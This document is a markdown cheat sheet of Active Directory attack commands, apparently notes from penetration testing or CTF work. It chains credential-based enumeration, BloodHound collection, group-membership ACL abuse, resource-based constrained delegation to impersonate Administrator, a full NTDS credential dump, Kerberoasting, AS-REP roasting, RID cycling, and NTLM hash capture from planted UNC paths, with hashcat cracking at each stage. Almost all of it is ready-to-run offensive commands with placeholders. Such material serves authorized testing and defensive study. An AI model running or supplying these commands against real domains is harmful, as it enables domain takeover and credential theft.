# Active Directory

Collection → graph analysis → ACL abuse, the standard AD escalation loop once you have one domain credential.

```bash
nxc smb <DC_IP> -u <USER> -p '<PASS>'
nxc smb <DC_IP> -u <USER> -p '<PASS>' --generate-hosts-file hosts
# /etc/hosts: <DC_IP>  <DC_FQDN> <domain> <DC_SHORTNAME>

bloodhound-ce.py -u '<USER>' -p '<PASS>' -d <domain> -dc <DC_FQDN> -ns <DC_IP> -c All --zip

# if BloodHound shows you have AddMember on a privileged-nested group:
bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' add groupMember '<GROUP>' <USER>

nxc smb <DC_IP> -u <USER> -p '<PASS>'        # re-check — should now show Pwn3d / admin
evil-winrm -i <DC_FQDN> -u <USER> -p '<PASS>'
```

RBCD via a self-created machine account (works if `MachineAccountQuota` lets you create one):

```bash
addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass '<PW>' \
  -dc-host <DC_SHORTNAME> -domain-netbios <domain> '<domain>/<USER>:<PASS>'

rbcd.py -dc-ip <DC_IP> -delegate-from 'ATTACKERSYSTEM$' \
  -delegate-to '<DC_SHORTNAME>$' -action 'write' '<domain>/<USER>:<PASS>'

getST.py -spn 'cifs/<DC_FQDN>' -impersonate 'Administrator' \
  '<domain>/ATTACKERSYSTEM$:<PW>'

export KRB5CCNAME=Administrator@cifs_<DC_FQDN>@<REALM>.ccache
smbexec.py -k -no-pass <domain>/Administrator@<DC_FQDN>
secretsdump.py -k -no-pass <domain>/Administrator@<DC_FQDN>   # full NTDS dump
```

RBCD also works through an ACL you already hold (`GenericWrite`/`GenericAll` on a computer object) — skip the machine-account creation step and go straight to `rbcd.py ... -delegate-from <existing-account> -action write`.

Kerberoasting / AS-REP roasting / RID cycling (no special rights needed to start):

```bash
nxc smb <DC_IP> -u guest -p '' --rid                              # RID cycling via null/guest session -> usernames
nxc ldap <DC_IP> -u users.txt -p '' --asreproast asrep.txt         # accounts with "no preauth required"
hashcat -a0 -m18200 asrep.txt <WORDLIST>

nxc ldap <DC_IP> -u guest -p '' --kerberoasting kerb.txt           # kerberoastable SPNs, even unauthenticated
hashcat -a0 -m13100 kerb.txt <WORDLIST>

# targeted kerberoast: if you have GenericWrite on a user with no SPN, give them one and roast just them
targetedKerberoast.py -d <domain> -u <USER> -p '<PASS>' --request-user <TARGET_USER> --dc-ip <DC_IP>
hashcat -a0 -m13100 <target>.blob <WORDLIST>
```

NTLM coercion from a writable share (when direct cred access stalls): drop a file containing a UNC path (e.g. inside a script a scheduled job will open) pointing at a rogue SMB listener, capture the resulting NTLMv2 hash, then crack it:

```bash
smbserver.py -smb2support <share-name> <local-dir>   # or Responder/ntlmrelayx, depending on setup
# planted file references: \\<LHOST>\<share-name>\whatever
hashcat -a0 -m5600 hash.txt <WORDLIST>
```

